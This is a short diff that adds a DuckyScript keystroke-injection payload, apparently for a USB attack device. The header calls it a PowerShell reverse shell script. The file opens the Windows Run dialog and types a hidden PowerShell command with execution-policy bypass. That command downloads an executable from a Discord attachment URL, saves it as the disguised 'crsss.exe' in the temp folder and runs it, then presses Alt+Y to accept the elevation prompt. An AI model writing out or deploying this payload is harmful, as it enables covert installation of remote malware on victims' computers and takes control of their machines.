@@ -1,0 +1,14 @@
+REM --- Reverse shell script using POWERSHELL to connect to host (WITHOUT DEFENDER KILLER)
+REM --- Made by Zebratic#6969
+
+REM --- STARTUP DELAY
+DELAY 500
+
+
+REM --- DOWNLOAD AND RUN PAYLOAD
+GUI r
+DELAY 50
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/869675809466626058/887997205166825483/NeroNet.exe',\"$env:temp\crsss.exe\"); Start-Process \"$env:temp\crsss.exe\""
+ENTER
+DELAY 1500
+ALT y
